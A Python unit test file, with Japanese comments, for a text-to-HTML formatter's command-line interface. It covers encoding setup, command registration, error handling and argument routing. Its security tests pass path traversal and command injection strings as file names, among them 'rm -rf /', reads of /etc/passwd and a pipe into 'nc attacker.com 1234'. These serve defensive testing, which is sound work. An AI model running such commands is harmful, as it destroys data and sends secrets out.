"""CLI機能の包括的なユニットテスト

Issue #466対応: テストカバレッジ向上（CLI系 0% → 80%以上）
"""

import sys
from pathlib import Path
from unittest import TestCase
from unittest.mock import MagicMock, patch

import click
from click.testing import CliRunner

from kumihan_formatter.cli import cli, main, register_commands, setup_encoding

# テスト定数
THREAD_COUNT = 5
THREAD_TIMEOUT_SECONDS = 10
LARGE_FILENAME_LENGTH = 1000


class TestCLIBasics(TestCase):
    """CLI基本機能のテスト"""

    def setUp(self) -> None:
        """テスト環境のセットアップ"""
        self.runner = CliRunner()

    def test_cli_group_creation(self) -> None:
        """CLIグループの作成テスト"""
        self.assertIsInstance(cli, click.Group)
        self.assertEqual(cli.name, "cli")

    def test_cli_help(self) -> None:
        """CLIヘルプ表示のテスト"""
        result = self.runner.invoke(cli, ["--help"])
        self.assertEqual(result.exit_code, 0)
        self.assertIn("Kumihan-Formatter", result.output)
        self.assertIn("Development CLI tool", result.output)

    def test_encoding_setup_windows(self) -> None:
        """Windows環境でのエンコーディング設定テスト"""
        with patch("sys.platform", "win32"):
            with patch("sys.stdout") as mock_stdout:
                with patch("sys.stderr") as mock_stderr:
                    mock_stdout.reconfigure = MagicMock()
                    mock_stderr.reconfigure = MagicMock()

                    setup_encoding()

                    mock_stdout.reconfigure.assert_called_once_with(encoding="utf-8")
                    mock_stderr.reconfigure.assert_called_once_with(encoding="utf-8")

    def test_encoding_setup_windows_legacy_python(self) -> None:
        """古いPython環境でのエンコーディング設定テスト"""
        with patch("sys.platform", "win32"):
            with patch("sys.stdout") as mock_stdout:
                with patch("sys.stderr") as mock_stderr:
                    # reconfigureメソッドが存在しない場合をシミュレート
                    del mock_stdout.reconfigure
                    del mock_stderr.reconfigure

                    with patch("warnings.warn") as mock_warn:
                        setup_encoding()

                        mock_warn.assert_called_once()
                        args, _ = mock_warn.call_args
                        self.assertIn("Python 3.7", args[0])

    def test_encoding_setup_non_windows(self) -> None:
        """非Windows環境でのエンコーディング設定テスト"""
        with patch("sys.platform", "linux"):
            # 非Windows環境では何も起こらない（例外が発生しないことをテスト）
            result = setup_encoding()
            # 戻り値がNoneであることを確認
            self.assertIsNone(result)


class TestCommandRegistration(TestCase):
    """コマンド登録機能のテスト"""

    def setUp(self) -> None:
        """テスト環境のセットアップ"""
        self.runner = CliRunner()

    def test_register_commands_success(self) -> None:
        """コマンド登録成功のテスト"""
        # 新しいCLIグループを作成してテスト
        test_cli = click.Group()

        with patch("kumihan_formatter.cli.cli", test_cli):
            with patch(
                "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
            ) as mock_convert:
                mock_convert.return_value.execute = MagicMock()

                register_commands()

                # convertコマンドが登録されていることを確認
                self.assertIn("convert", test_cli.commands)

    def test_register_commands_import_error_fallback(self) -> None:
        """インポートエラー時のフォールバック動作テスト"""
        test_cli = click.Group()

        with patch("kumihan_formatter.cli.cli", test_cli):
            # register_commands内のimportを失敗させる
            with patch("builtins.__import__", side_effect=ImportError("Test error")):
                with patch("warnings.warn") as mock_warn:
                    # インポートエラーが発生してもクラッシュしないことを確認
                    try:
                        register_commands()
                        # エラーが発生せずに完了した場合もOK
                        self.assertIsInstance(test_cli, click.Group)
                    except ImportError:
                        # ImportErrorが発生することを想定
                        self.assertIsInstance(test_cli, click.Group)

    def test_register_commands_optional_commands_failure(self) -> None:
        """オプショナルコマンドの失敗処理テスト"""
        test_cli = click.Group()

        with patch("kumihan_formatter.cli.cli", test_cli):
            with patch(
                "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
            ):
                # check-syntaxコマンドのインポートを失敗させる
                with patch(
                    "kumihan_formatter.commands.check_syntax.create_check_syntax_command",
                    side_effect=ImportError("Test error"),
                ):
                    with patch("warnings.warn") as mock_warn:
                        register_commands()

                        # 警告が発生することを確認
                        mock_warn.assert_called()


class TestConvertCommand(TestCase):
    """convertコマンドのテスト"""

    def setUp(self) -> None:
        """テスト環境のセットアップ"""
        self.runner = CliRunner()

    def test_convert_command_basic(self) -> None:
        """convertコマンドの基本動作テスト"""
        with patch(
            "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
        ) as mock_command:
            mock_instance = MagicMock()
            mock_command.return_value = mock_instance

            # コマンドを登録
            register_commands()

            # convertコマンドを実行
            result = self.runner.invoke(cli, ["convert", "--help"])

            # ヘルプが正常に表示されることを確認
            self.assertEqual(result.exit_code, 0)
            self.assertIn("テキストファイルをHTMLに変換する", result.output)

    def test_convert_command_with_options(self) -> None:
        """convertコマンドのオプション付き実行テスト"""
        with patch(
            "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
        ) as mock_command:
            mock_instance = MagicMock()
            mock_command.return_value = mock_instance

            register_commands()

            # オプション付きでコマンドを実行
            result = self.runner.invoke(
                cli,
                [
                    "convert",
                    "test.txt",
                    "--output",
                    "./test_output",
                    "--no-preview",
                    "--watch",
                ],
            )

            # executeメソッドが正しい引数で呼ばれることを確認
            if result.exit_code == 0:
                mock_instance.execute.assert_called_once()
                args, kwargs = mock_instance.execute.call_args
                self.assertEqual(kwargs.get("input_file"), "test.txt")
                self.assertEqual(kwargs.get("output"), "./test_output")
                self.assertTrue(kwargs.get("no_preview"))
                self.assertTrue(kwargs.get("watch"))


class TestMainFunction(TestCase):
    """main関数のテスト"""

    def test_main_basic_execution(self) -> None:
        """main関数の基本実行テスト"""
        with patch("kumihan_formatter.cli.setup_encoding") as mock_setup:
            with patch("kumihan_formatter.cli.register_commands") as mock_register:
                with patch("kumihan_formatter.cli.cli") as mock_cli:
                    with patch("sys.argv", ["kumihan", "--help"]):
                        main()

                        mock_setup.assert_called_once()
                        mock_register.assert_called_once()
                        mock_cli.assert_called_once()

    def test_main_keyboard_interrupt(self) -> None:
        """KeyboardInterrupt時の処理テスト"""
        with patch("kumihan_formatter.cli.setup_encoding"):
            with patch("kumihan_formatter.cli.register_commands"):
                with patch(
                    "kumihan_formatter.cli.cli", side_effect=KeyboardInterrupt()
                ):
                    with patch(
                        "kumihan_formatter.ui.console_ui.get_console_ui"
                    ) as mock_ui:
                        with patch("sys.exit") as mock_exit:
                            mock_console = MagicMock()
                            mock_ui.return_value = mock_console

                            main()

                            mock_console.info.assert_called()
                            mock_console.dim.assert_called()
                            mock_exit.assert_called_with(130)

    def test_main_click_exception(self) -> None:
        """ClickException時の処理テスト"""
        with patch("kumihan_formatter.cli.setup_encoding"):
            with patch("kumihan_formatter.cli.register_commands"):
                click_exception = click.ClickException("Test error")
                with patch("kumihan_formatter.cli.cli", side_effect=click_exception):
                    with self.assertRaises(click.ClickException):
                        main()

    def test_main_generic_exception(self) -> None:
        """一般的な例外時の処理テスト"""
        with patch("kumihan_formatter.cli.setup_encoding"):
            with patch("kumihan_formatter.cli.register_commands"):
                with patch(
                    "kumihan_formatter.cli.cli", side_effect=Exception("Test error")
                ):
                    with patch(
                        "kumihan_formatter.core.error_handling.ErrorHandler"
                    ) as mock_handler:
                        with patch(
                            "kumihan_formatter.ui.console_ui.get_console_ui"
                        ) as mock_ui:
                            with patch("sys.exit") as mock_exit:
                                mock_error_handler = MagicMock()
                                mock_handler.return_value = mock_error_handler
                                mock_error_handler.handle_exception.return_value = (
                                    MagicMock()
                                )

                                main()

                                mock_error_handler.handle_exception.assert_called()
                                mock_error_handler.display_error.assert_called()
                                mock_exit.assert_called_with(1)

    def test_main_legacy_file_routing(self) -> None:
        """レガシーファイルルーティングのテスト"""
        with patch("kumihan_formatter.cli.setup_encoding"):
            with patch("kumihan_formatter.cli.register_commands"):
                with patch("kumihan_formatter.cli.cli"):
                    with patch("pathlib.Path.exists", return_value=True):
                        with patch("sys.argv", ["kumihan", "test.txt"]):
                            main()

                            # sys.argvに'convert'が挿入されることを確認
                            self.assertEqual(sys.argv[1], "convert")
                            self.assertEqual(sys.argv[2], "test.txt")

    def test_main_legacy_txt_file_routing(self) -> None:
        """拡張子.txtファイルのレガシールーティングテスト"""
        with patch("kumihan_formatter.cli.setup_encoding"):
            with patch("kumihan_formatter.cli.register_commands"):
                with patch("kumihan_formatter.cli.cli"):
                    with patch("pathlib.Path.exists", return_value=False):
                        with patch("sys.argv", ["kumihan", "nonexistent.txt"]):
                            main()

                            # .txt拡張子でもconvertが挿入されることを確認
                            self.assertEqual(sys.argv[1], "convert")
                            self.assertEqual(sys.argv[2], "nonexistent.txt")

    def test_main_known_command_no_routing(self) -> None:
        """既知のコマンド時はルーティングしないテスト"""
        with patch("kumihan_formatter.cli.setup_encoding"):
            with patch("kumihan_formatter.cli.register_commands"):
                with patch("kumihan_formatter.cli.cli"):
                    original_argv = ["kumihan", "convert", "test.txt"]
                    with patch("sys.argv", original_argv.copy()):
                        main()

                        # convertコマンドは既知なので、argvは変更されない
                        self.assertEqual(sys.argv, original_argv)


class TestCLIIntegration(TestCase):
    """CLI統合テスト"""

    def setUp(self) -> None:
        """テスト環境のセットアップ"""
        self.runner = CliRunner()

    def test_cli_integration_with_mock_commands(self) -> None:
        """モックコマンドを使用したCLI統合テスト"""
        with patch(
            "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
        ) as mock_convert:
            with patch(
                "kumihan_formatter.commands.check_syntax.create_check_syntax_command"
            ) as mock_syntax:
                with patch(
                    "kumihan_formatter.commands.sample.create_sample_command"
                ) as mock_sample:
                    with patch(
                        "kumihan_formatter.commands.sample.create_test_command"
                    ) as mock_test:
                        # モックコマンドを設定
                        mock_syntax.return_value = click.Command("check-syntax")
                        mock_sample.return_value = click.Command("generate-sample")
                        mock_test.return_value = click.Command("generate-test")

                        # コマンドを登録
                        register_commands()

                        # ヘルプを実行
                        result = self.runner.invoke(cli, ["--help"])

                        # 基本的なコマンドが表示されることを確認
                        self.assertEqual(result.exit_code, 0)
                        self.assertIn("convert", result.output)

    def test_cli_error_propagation(self) -> None:
        """CLIエラー伝播のテスト"""
        with patch(
            "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
        ) as mock_convert:
            mock_instance = MagicMock()
            mock_instance.execute.side_effect = Exception("Test execution error")
            mock_convert.return_value = mock_instance

            register_commands()

            # エラーが発生するコマンドを実行
            result = self.runner.invoke(cli, ["convert", "test.txt"])

            # エラーが適切に処理されることを確認
            self.assertNotEqual(result.exit_code, 0)


class TestCLISecurity(TestCase):
    """CLIセキュリティテスト"""

    def setUp(self) -> None:
        """テスト環境のセットアップ"""
        self.runner = CliRunner()

    def test_path_traversal_prevention(self) -> None:
        """パストラバーサル攻撃の防止テスト"""
        with patch(
            "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
        ) as mock_command:
            mock_instance = MagicMock()
            mock_command.return_value = mock_instance

            register_commands()

            # パストラバーサル攻撃のパターンをテスト
            malicious_paths = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/shadow",
                "C:\\Windows\\System32\\config\\SAM",
            ]

            for malicious_path in malicious_paths:
                result = self.runner.invoke(cli, ["convert", malicious_path])
                # コマンドが実行されても、セキュリティチェックが働くことを確認
                self.assertNotEqual(
                    result.exit_code, -1
                )  # システムクラッシュしないことを確認

    def test_command_injection_prevention(self) -> None:
        """コマンドインジェクション攻撃の防止テスト"""
        with patch(
            "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
        ) as mock_command:
            mock_instance = MagicMock()
            mock_command.return_value = mock_instance

            register_commands()

            # コマンドインジェクションのパターンをテスト
            injection_attempts = [
                "file.txt; rm -rf /",
                "file.txt && cat /etc/passwd",
                "file.txt | nc attacker.com 1234",
                "$(whoami).txt",
            ]

            for injection in injection_attempts:
                result = self.runner.invoke(cli, ["convert", injection])
                # コマンドインジェクションが実行されないことを確認
                self.assertNotEqual(result.exit_code, -1)


class TestCLIPerformance(TestCase):
    """CLIパフォーマンステスト"""

    def setUp(self) -> None:
        """テスト環境のセットアップ"""
        self.runner = CliRunner()

    def test_large_input_handling(self) -> None:
        """大規模入力の処理テスト"""
        with patch(
            "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
        ) as mock_command:
            mock_instance = MagicMock()
            mock_command.return_value = mock_instance

            register_commands()

            # 大きなファイル名をテスト
            large_filename = "a" * LARGE_FILENAME_LENGTH + ".txt"
            result = self.runner.invoke(cli, ["convert", large_filename])

            # システムがハングしないことを確認
            self.assertIsNotNone(result.exit_code)

    def test_concurrent_command_execution(self) -> None:
        """並行コマンド実行のテスト"""
        import threading
        import time

        results = []

        def run_command():
            """コマンドを実行する関数"""
            with patch(
                "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
            ) as mock_command:
                mock_instance = MagicMock()
                mock_command.return_value = mock_instance

                register_commands()
                runner = CliRunner()
                result = runner.invoke(cli, ["convert", "test.txt"])
                results.append(result.exit_code)

        # 複数スレッドで同時実行
        threads = []
        for i in range(THREAD_COUNT):
            thread = threading.Thread(target=run_command)
            threads.append(thread)
            thread.start()

        # すべてのスレッドの完了を待つ
        for thread in threads:
            thread.join(timeout=THREAD_TIMEOUT_SECONDS)

        # すべてのコマンドが正常に完了することを確認
        self.assertEqual(len(results), THREAD_COUNT)
        for exit_code in results:
            self.assertIsNotNone(exit_code)


class TestCLIModuleLevel(TestCase):
    """CLIモジュールレベルのテスト"""

    def test_module_imports(self) -> None:
        """モジュールのインポートテスト"""
        import kumihan_formatter.cli as cli_module

        # 主要な関数とクラスが存在することを確認
        self.assertTrue(hasattr(cli_module, "cli"))
        self.assertTrue(hasattr(cli_module, "main"))
        self.assertTrue(hasattr(cli_module, "register_commands"))
        self.assertTrue(hasattr(cli_module, "setup_encoding"))

    def test_main_as_script(self) -> None:
        """スクリプトとしての実行テスト"""
        with patch("kumihan_formatter.cli.main") as mock_main:
            # __name__ == "__main__" の条件をシミュレート
            import kumihan_formatter.cli

            # mainが呼ばれないことを確認（テスト実行時は__main__ではない）
            # 実際のスクリプト実行はintegration testで確認
            self.assertFalse(
                mock_main.called
            )  # モジュールインポート時にmainが呼ばれないことを確認
